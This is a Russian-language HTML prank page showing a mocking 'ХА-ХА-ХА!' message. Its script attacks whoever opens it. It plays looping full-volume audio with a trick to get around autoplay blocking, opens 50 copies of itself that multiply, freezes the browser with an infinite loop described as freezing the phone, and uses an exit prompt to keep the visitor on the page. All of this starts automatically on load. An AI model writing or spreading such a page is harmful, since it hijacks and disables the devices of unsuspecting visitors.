<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ты попал!</title>
    <style>
        body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: black;
            color: white;
            font-size: 4rem;
            font-family: Arial, sans-serif;
            text-transform: uppercase;
            text-align: center;
        }
    </style>
</head>
<body>
    <div>ХА-ХА-ХА!</div>
    <audio id="sound" src="https://www.myinstants.com/media/sounds/stony-prank-mem-2025.mp3" loop></audio>

    <script>
        let sound = document.getElementById("sound");

        function startMadness() {
            sound.volume = 1.0; // Громкость на максимум
            sound.play().catch(err => console.log("Ошибка автозапуска:", err));

            setTimeout(spamTabs, 1000); // Открытие вкладок через 1 сек
            setTimeout(freezePhone, 2000); // Запуск зависания через 2 сек
        }

        function spamTabs() {
            for (let i = 0; i < 50; i++) { // Открываем 50 вкладок
                window.open(window.location.href, '_blank');
            }
        }

        function freezePhone() {
            while (true) {
                console.log("Телефон зависает...");
            }
        }

        window.onbeforeunload = function() {
            return "Ты точно хочешь уйти?";
        };

        // Автоматический запуск звука при первом взаимодействии
        document.addEventListener("click", function() {
            startMadness();
        });

        // Продолжение звука при сворачивании (для Android)
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                sound.play();
            }
        });

        // Мгновенное включение звука при загрузке (обход блокировки)
        setTimeout(() => {
            startMadness();
        }, 500);
    </script>
</body>
</html>
